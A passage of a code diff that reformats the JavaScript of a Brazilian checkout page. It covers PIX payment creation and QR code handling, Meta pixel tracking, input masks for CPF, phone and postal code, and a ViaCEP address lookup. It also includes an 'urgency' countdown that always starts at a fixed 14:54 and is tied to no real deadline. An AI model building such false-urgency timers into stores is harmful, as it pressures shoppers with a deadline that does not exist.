+                    expiresInDays: 1
                 }
             };
 
             try {
                 const response = await fetch('/api/pix', {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(payload)
                 });
-                
+
                 const data = await response.json();
                 const transaction = data.transaction || data.data || data.result || data;
                 const transactionId = data.id || transaction.id;
                 const qrCode =
-                    data.qrCode ||
-                    transaction.qrCode ||
-                    transaction.pix?.qrCode ||
-                    data.pix?.qrCode ||
-                    transaction.pixCode ||
-                    data.pixCode ||
-                    transaction.copyPaste ||
-                    data.copyPaste ||
-                    "";
+                    data.qrCode || transaction.qrCode || transaction.pix?.qrCode ||
+                    data.pix?.qrCode || transaction.pixCode || data.pixCode ||
+                    transaction.copyPaste || data.copyPaste || "";
                 const qrImg =
-                    data.qrCodeBase64 ||
-                    transaction.qrCodeBase64 ||
-                    transaction.pix?.qrCodeBase64 ||
-                    data.pix?.qrCodeBase64 ||
-                    transaction.qrImage ||
-                    data.qrImage ||
-                    transaction.encodedImage ||
-                    data.encodedImage ||
-                    "";
-                
+                    data.qrCodeBase64 || transaction.qrCodeBase64 || transaction.pix?.qrCodeBase64 ||
+                    data.pix?.qrCodeBase64 || transaction.qrImage || data.qrImage ||
+                    transaction.encodedImage || data.encodedImage || "";
+
                 if (response.ok && transactionId) {
-                    // Meta Event: AddPaymentInfo (PIX Gerado)
                     fbq('track', 'AddPaymentInfo', {
                         content_ids: [String(prodId)],
                         content_name: produto.nome,
@@ -402,7 +566,6 @@
                     });
 
                     localStorage.setItem('lastPurchaseValue', totalVal);
-
                     localStorage.setItem('lastPixData', JSON.stringify({
                         id: transactionId,
                         qrCode,
@@ -423,7 +586,9 @@
             }
         });
 
-        // 5. Função de copiar o PIX
+        // =============================
+        // 5. Copiar PIX
+        // =============================
         function copiarPix() {
             const input = document.getElementById('pixCode');
             input.select();
@@ -432,60 +597,68 @@
             alert("Código PIX copiado!");
         }
 
-        // 6. Cronômetro de Urgência
+        // =============================
+        // 6. Timer de Urgência
+        // =============================
         let time = (14 * 60) + 54;
-        const minEl = document.getElementById('timerMin');
-        const secEl = document.getElementById('timerSec');
+        const timerDisplay = document.getElementById('timerDisplay');
+
         setInterval(() => {
-            if(time <= 0) return;
+            if (time <= 0) return;
             time--;
             const mins = Math.floor(time / 60);
             const secs = time % 60;
-            minEl.innerText = mins < 10 ? '0'+mins : mins;
-            secEl.innerText = secs < 10 ? '0'+secs : secs;
+            timerDisplay.innerText =
+                '00:' +
+                (mins < 10 ? '0' + mins : mins) + ':' +
+                (secs < 10 ? '0' + secs : secs);
         }, 1000);
 
-        // 7. Máscaras de Input
+        // =============================
+        // 7. Input Masks
+        // =============================
         function maskCPF(input) {
             let v = input.value.replace(/\D/g, '');
-            if(v.length > 11) v = v.slice(0, 11);
-            if(v.length > 9) v = v.replace(/(\d{3})(\d{3})(\d{3})(\d{1,2})/, "$1.$2.$3-$4");
-            else if(v.length > 6) v = v.replace(/(\d{3})(\d{3})(\d{1,3})/, "$1.$2.$3");
-            else if(v.length > 3) v = v.replace(/(\d{3})(\d{1,3})/, "$1.$2");
+            if (v.length > 11) v = v.slice(0, 11);
+            if (v.length > 9) v = v.replace(/(\d{3})(\d{3})(\d{3})(\d{1,2})/, "$1.$2.$3-$4");
+            else if (v.length > 6) v = v.replace(/(\d{3})(\d{3})(\d{1,3})/, "$1.$2.$3");
+            else if (v.length > 3) v = v.replace(/(\d{3})(\d{1,3})/, "$1.$2");
             input.value = v;
         }
 
         function maskPhone(input) {
             let v = input.value.replace(/\D/g, '');
-            if(v.length > 11) v = v.slice(0, 11);
-            if(v.length > 10) v = v.replace(/^(\d{2})(\d{5})(\d{4}).*/, "($1) $2-$3");
-            else if(v.length > 6) v = v.replace(/^(\d{2})(\d{4})(\d{0,4}).*/, "($1) $2-$3");
-            else if(v.length > 2) v = v.replace(/^(\d{2})(\d{0,5})/, "($1) $2");
+            if (v.length > 11) v = v.slice(0, 11);
+            if (v.length > 10) v = v.replace(/^(\d{2})(\d{5})(\d{4}).*/, "($1) $2-$3");
+            else if (v.length > 6) v = v.replace(/^(\d{2})(\d{4})(\d{0,4}).*/, "($1) $2-$3");
+            else if (v.length > 2) v = v.replace(/^(\d{2})(\d{0,5})/, "($1) $2");
             input.value = v;
         }
 
         function maskCEP(input) {
             let v = input.value.replace(/\D/g, '');
-            if(v.length > 8) v = v.slice(0, 8);
-            if(v.length > 5) v = v.replace(/^(\d{5})(\d{1,3}).*/, "$1-$2");
+            if (v.length > 8) v = v.slice(0, 8);
+            if (v.length > 5) v = v.replace(/^(\d{5})(\d{1,3}).*/, "$1-$2");
             input.value = v;
         }
 
-        // 8. Busca Automática de CEP (ViaCEP)
+        // =============================
+        // 8. ViaCEP Auto-fill
+        // =============================
         async function buscarCEP(cep) {
             const cleanCep = cep.replace(/\D/g, '');
-            if(cleanCep.length === 8) {
+            if (cleanCep.length === 8) {
                 try {
                     const response = await fetch(`https://viacep.com.br/ws/${cleanCep}/json/`);
                     const data = await response.json();
-                    if(!data.erro) {
+                    if (!data.erro) {
                         document.getElementById('chkRua').value = data.logradouro;
                         document.getElementById('chkBairro').value = data.bairro;
                         document.getElementById('chkCidade').value = data.localidade;
                         document.getElementById('chkEstado').value = data.uf;
-                        document.getElementById('chkNumero').focus(); // Joga o foco pro número
+                        document.getElementById('chkNumero').focus();
                     }
-                } catch(error) {
+                } catch (error) {
                     console.error("Erro ao buscar CEP:", error);
                 }
             }
